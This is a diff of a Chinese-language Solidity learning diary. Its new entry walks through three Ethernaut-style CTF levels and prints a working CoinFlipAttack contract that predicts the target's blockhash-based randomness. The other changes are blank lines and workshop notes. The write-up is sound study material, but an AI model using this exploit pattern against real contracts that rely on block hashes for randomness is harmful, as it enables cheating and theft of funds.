@@ -24,10 +24,41 @@ ha
 -   第二关，主要是得知道当一个交易没有携带任何 Data（即不是调用某个具体函数）且带有金额时，EVM 会自动触发合约的 `receive()` 函数，先 `await contract.contribute({value: toWei("0.0001")})` 转一笔进去，然后 `await contract.sendTransaction({value: '1'})` 再转1WEI进去，就可以 withdraw 了
     
 -   第三关，构造函数写错了，直接调用`` wait contract.Fal1out({value: 1})` ``就可以了，老编译器版本构造函数是和合约名一样的，后来改成 constructor 了，估计就是怕人写错吧
+    
+-   第四关，外部攻击，原逻辑只有`blockhash(block.number - 1)` 这一个地方是会变化的，而 block.numer 不变的情况下，hash 出来的值也是不会变的，所以新弄一个合约，先把这次的 side算出来，然后用来调用 CoinFlip 的 flip 函数（因为是一次执行，所以外部和内部的 block.numer 肯定是一样的）
+    
+    ```remix-solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+    
+    interface ICoinFlip {
+        function flip(bool _guess) external returns (bool);
+    }
+    
+    contract CoinFlipAttack {
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        ICoinFlip public targetContract; // CoinFlip 合约地址
+    
+        constructor(address _targetContract) {
+            targetContract = ICoinFlip(_targetContract);
+        }
+        
+        function attack() public {
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 coinFlip = blockValue / FACTOR;
+            bool side = coinFlip == 1 ? true : false;
+    
+            targetContract.flip(side);
+        }
+    }
+    ```
+    
+    用了比较原始的方式连点了10次，有点呆，不过核心就是这么个逻辑了
 <!-- DAILY_CHECKIN_2026-01-25_END -->
 
 # 2026-01-24
 <!-- DAILY_CHECKIN_2026-01-24_START -->
+
 
 
 1.继续solidy101，复习一下
@@ -37,6 +68,7 @@ ha
 
 # 2026-01-23
 <!-- DAILY_CHECKIN_2026-01-23_START -->
+
 
 
 
@@ -54,6 +86,7 @@ ha
 
 
 
+
 1.参会 Dapp Workshop
 
 2.参会南塘 DAO
@@ -65,6 +98,7 @@ ha
 
 # 2026-01-21
 <!-- DAILY_CHECKIN_2026-01-21_START -->
+
 
 
 
@@ -90,6 +124,7 @@ ha
 
 
 
+
 1.参会公共物品资金分配
 
 2.参会「Solidity Walk Through」
@@ -99,6 +134,7 @@ ha
 
 # 2026-01-19
 <!-- DAILY_CHECKIN_2026-01-19_START -->
+
 
 
 
@@ -179,6 +215,7 @@ contract SimpleStorage {
 
 # 2026-01-18
 <!-- DAILY_CHECKIN_2026-01-18_START -->
+
 
 
 
@@ -387,6 +424,7 @@ L1（以太坊主网）的问题：
 
 # 2026-01-17
 <!-- DAILY_CHECKIN_2026-01-17_START -->
+
 
 
 
@@ -741,6 +779,7 @@ tokenURI(tokenId) → 一个 URL
 
 
 
+
 ## 安全
 
 ### 常见风险
@@ -847,6 +886,7 @@ tokenURI(tokenId) → 一个 URL
 
 
 
+
 # 创建钱包以及测试网转账
 
 [https://sepolia.etherscan.io/tx/0x33c92ea26d4603816cc29b34793c042d4f2c8ddc0ac1f998604b4656f37eda59](https://sepolia.etherscan.io/tx/0x33c92ea26d4603816cc29b34793c042d4f2c8ddc0ac1f998604b4656f37eda59)
@@ -922,6 +962,7 @@ tokenURI(tokenId) → 一个 URL
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
